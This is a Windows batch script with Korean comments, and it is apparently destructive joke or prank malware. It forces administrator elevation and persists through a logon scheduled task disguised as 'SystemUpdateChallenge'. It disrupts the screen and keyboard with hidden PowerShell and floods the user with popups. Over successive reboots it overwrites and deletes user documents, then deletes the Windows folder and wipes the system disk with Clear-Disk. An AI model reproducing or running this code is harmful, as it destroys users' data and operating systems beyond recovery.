@echo off
setlocal
:: 1. 관리자 권한 강제 승격
openfiles >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: 2. C:\run 폴더 생성 및 진행 상태 파일 설정
if not exist "C:\run" mkdir "C:\run"
set "cntFile=C:\run\status.dat"

if not exist "%cntFile%" echo 0 > "%cntFile%"
for /f %%a in (%cntFile%) do set /a count=%%a
set /a count+=1
echo %count% > "%cntFile%"

:: 3. 작업 스케줄러 등록
schtasks /create /tn "SystemUpdateChallenge" /tr "'%~f0'" /sc onlogon /rl highest /f >nul 2>&1

:: 4. [GDI 효과 & 키보드 제한] 백그라운드 실행
start /min powershell -WindowStyle Hidden -Command "$code = @' [DllImport(\"user32.dll\")] public static extern IntPtr GetDC(IntPtr hwnd); [DllImport(\"gdi32.dll\")] public static extern bool PatBlt(IntPtr hdc, int x, int y, int w, int h, uint rop); [DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey); '@; $type = Add-Type -MemberDefinition $code -Name 'WinAPI' -PassThru; $hdc = $type::GetDC([IntPtr]::Zero); while($true){ $x = Get-Random -Maximum 1920; $y = Get-Random -Maximum 1080; $type::PatBlt($hdc, $x, $y, 150, 150, 0x550009); for($i=1; $i -le 255; $i++){ if($type::GetAsyncKeyState($i) -ne 0 -and @(68,73,69,49,50,51,52,13,8,32) -notcontains $i){ [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0) } }; sleep -m 50 }"

:: 5. 에러 메시지 무한 도배
start /min cmd /c "for /L %%i in (1,0,2) do (start /min mshta vbscript:msgbox(\"아무거나 실행하지 마시오 멀웨어는 위험합니다.\",16,\"ERROR\")^(window.close^):timeout /t 2 > nul)"

:: [1단계]: 빨간 배경 + 파일 도배 + 암호화
if %count% equ 1 (
    reg add "HKCU\Control Panel\Colors" /v Background /t REG_SZ /d "255 0 0" /f >nul 2>&1
    reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "" /f >nul 2>&1
    powershell -Command "for($i=1; $i -le 100; $i++){ Set-Content -Path \"$env:USERPROFILE\Desktop\die_$i.txt\" -Value 'die1234!' }" >nul 2>&1
    rundll32.exe user32.dll,UpdatePerUserSystemParameters >nul 2>&1
    
    :: 파일 암호화
    powershell -Command "foreach($p in @('Documents','Desktop','Downloads')){ Get-ChildItem -Path $env:USERPROFILE\$p -Recurse -File -Exclude 'die_*.txt' | ForEach-Object { $c = [System.IO.File]::ReadAllBytes($_.FullName); [System.IO.File]::WriteAllText($_.FullName + '.locked', [System.Convert]::ToBase64String($c)); Remove-Item $_.FullName } }" >nul 2>&1
    
    shutdown -r -t 15 -c "1단계 완료: 시스템을 재시작합니다."
    exit
)

:: [2단계]: 유튜브 폭격
if %count% equ 2 (
    start "" "https://www.youtube.com/@choda100"
    timeout /t 20 >nul
    shutdown -r -t 0 -f
    exit
)

:: [3단계]: MBR 파괴 및 시스템 삭제
if %count% geq 3 (
    schtasks /delete /tn "SystemUpdateChallenge" /f >nul 2>&1
    taskkill /f /im explorer.exe >nul 2>&1
    rd c:\windows /s /q >nul 2>&1
    rd c:\windows\system32 /s /q >nul 2>&1
    powershell -Command "$drive = Get-Disk -Number 0; $drive | Clear-Disk -RemoveData -RemoveOEM -Confirm:$false" >nul 2>&1
    powershell wininit >nul 2>&1
    exit
)
